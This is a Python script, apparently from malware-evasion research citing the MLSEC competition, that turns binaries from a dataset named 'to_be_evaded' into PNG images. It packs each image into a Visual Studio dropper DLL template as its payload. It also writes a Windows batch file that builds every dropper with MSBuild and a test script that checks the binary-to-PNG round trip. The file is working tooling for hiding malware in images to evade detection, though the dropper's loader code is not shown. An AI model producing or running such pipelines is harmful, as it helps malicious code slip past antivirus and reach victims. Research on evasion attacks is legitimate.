#!/usr/bin/env python3
"""
Batch processor to create PNG-embedded droppers from malware dataset
Based on the MLSEC paper approach using lodepng
"""

import sys
import os
import shutil
import subprocess
from pathlib import Path

def create_png_dropper_batch():
    """
    Process all binaries in to_be_evaded_ds_unpacked and create PNG-embedded versions
    """
    
    # Paths
    source_dataset = Path("/home/mihir/Downloads/to_be_evaded_ds_unpacked")
    dropper_dir = Path("/home/mihir/Dropper")
    image_dll_dir = dropper_dir / "image.dll" 
    utils_dir = dropper_dir / "utils"
    
    # Output directory for processed samples
    output_dir = dropper_dir / "png_embedded_samples"
    output_dir.mkdir(exist_ok=True)
    
    # Template dropper directory
    dropper_template = image_dll_dir / "Dropper"
    
    if not source_dataset.exists():
        print(f"Error: Source dataset not found at {source_dataset}")
        return False
    
    if not dropper_template.exists():
        print(f"Error: Dropper template not found at {dropper_template}")
        return False
        
    # Get all binary files from dataset (excluding sha256sums.txt)
    binary_files = []
    for item in source_dataset.iterdir():
        if item.is_file() and item.name != "sha256sums.txt":
            binary_files.append(item)
    
    print(f"Found {len(binary_files)} binary files to process")
    
    successful = 0
    failed = 0
    
    for i, binary_file in enumerate(binary_files[:5]):  # Process first 5 for testing
        print(f"\n[{i+1}/{len(binary_files)}] Processing {binary_file.name}")
        
        try:
            # Step 1: Convert binary to PNG
            png_file = output_dir / f"{binary_file.name}.png"
            result = subprocess.run([
                sys.executable, 
                str(utils_dir / "pe_to_image.py"),
                str(binary_file),
                str(png_file)
            ], capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"Failed to convert {binary_file.name} to PNG: {result.stderr}")
                failed += 1
                continue
                
            print(f"✓ Converted to PNG: {png_file}")
            
            # Step 2: Create dropper directory for this sample
            sample_dropper_dir = output_dir / f"dropper_{binary_file.name}"
            if sample_dropper_dir.exists():
                shutil.rmtree(sample_dropper_dir)
            
            # Copy dropper template
            shutil.copytree(dropper_template, sample_dropper_dir)
            
            # Step 3: Copy the PNG to the dropper as payload.png
            payload_png = sample_dropper_dir / "payload.png" 
            shutil.copy2(png_file, payload_png)
            
            print(f"✓ Created dropper directory: {sample_dropper_dir}")
            print(f"✓ Payload embedded as: {payload_png}")
            
            successful += 1
            
        except Exception as e:
            print(f"Error processing {binary_file.name}: {e}")
            failed += 1
    
    print(f"\n=== Batch Processing Complete ===")
    print(f"Successfully processed: {successful}")
    print(f"Failed: {failed}")
    print(f"Output directory: {output_dir}")
    
    if successful > 0:
        print(f"\nNext steps:")
        print(f"1. Navigate to any dropper directory: cd {output_dir}/dropper_<sample_name>")
        print(f"2. Build the dropper DLL using Visual Studio or MSBuild")
        print(f"3. Test the dropper by loading the DLL")
    
    return successful > 0

def create_build_script():
    """Create a build script for compiling the droppers"""
    
    build_script = Path("/home/mihir/Dropper") / "build_png_droppers.bat"
    
    script_content = """@echo off
REM Build script for PNG-embedded droppers
REM Run this from Visual Studio Developer Command Prompt

set DROPPER_DIR=%~dp0png_embedded_samples

echo Building PNG-embedded droppers...

for /d %%d in ("%DROPPER_DIR%\\dropper_*") do (
    echo Building %%~nd...
    pushd "%%d"
    
    REM Build using MSBuild
    msbuild Dropper.vcxproj /p:Configuration=Release /p:Platform=Win32
    
    if exist "Release\\Dropper.dll" (
        echo ✓ Successfully built %%~nd
        copy "Release\\Dropper.dll" "..\\%%~nd.dll"
    ) else (
        echo ✗ Failed to build %%~nd
    )
    
    popd
)

echo Build process complete.
pause
"""
    
    with open(build_script, 'w') as f:
        f.write(script_content)
    
    print(f"Created build script: {build_script}")

def create_test_script():
    """Create a test script to verify the droppers work"""
    
    test_script = Path("/home/mihir/Dropper/utils") / "test_png_dropper.py"
    
    script_content = '''#!/usr/bin/env python3
"""
Test script to verify PNG dropper functionality
"""

import sys
import os
import subprocess
from pathlib import Path

def test_png_conversion(binary_path, png_path):
    """Test PNG conversion roundtrip"""
    
    print(f"Testing PNG conversion for: {binary_path}")
    
    # Convert to PNG
    result = subprocess.run([
        sys.executable, "pe_to_image.py", str(binary_path), str(png_path)
    ], capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"❌ PNG conversion failed: {result.stderr}")
        return False
    
    print(f"✅ PNG conversion successful")
    
    # Convert back to PE
    restored_path = png_path.with_suffix('.restored.exe')
    result = subprocess.run([
        sys.executable, "pe_to_image.py", str(png_path), str(restored_path)
    ], capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"❌ PNG to PE conversion failed: {result.stderr}")
        return False
    
    # Compare sizes
    original_size = os.path.getsize(binary_path)
    restored_size = os.path.getsize(restored_path)
    
    print(f"Original size: {original_size} bytes")
    print(f"Restored size: {restored_size} bytes")
    
    if original_size != restored_size:
        print(f"⚠️  Size mismatch (might be due to padding)")
    else:
        print(f"✅ Size matches perfectly")
    
    return True

def main():
    if len(sys.argv) < 3:
        print("Usage: python test_png_dropper.py <binary_file> <output_png>")
        sys.exit(1)
    
    binary_path = Path(sys.argv[1])
    png_path = Path(sys.argv[2])
    
    if not binary_path.exists():
        print(f"Binary file not found: {binary_path}")
        sys.exit(1)
    
    success = test_png_conversion(binary_path, png_path)
    
    if success:
        print("\\n🎉 Test completed successfully!")
    else:
        print("\\n💥 Test failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()
'''
    
    with open(test_script, 'w') as f:
        f.write(script_content)
    
    # Make executable
    os.chmod(test_script, 0o755)
    print(f"Created test script: {test_script}")

if __name__ == "__main__":
    print("🚀 Starting PNG-embedded dropper batch processing...")
    
    # Create supporting scripts
    create_build_script()
    create_test_script()
    
    # Process the dataset
    success = create_png_dropper_batch()
    
    if success:
        print("\n🎉 Ready to build PNG-embedded droppers!")
    else:
        print("\n💥 Processing failed. Check the errors above.")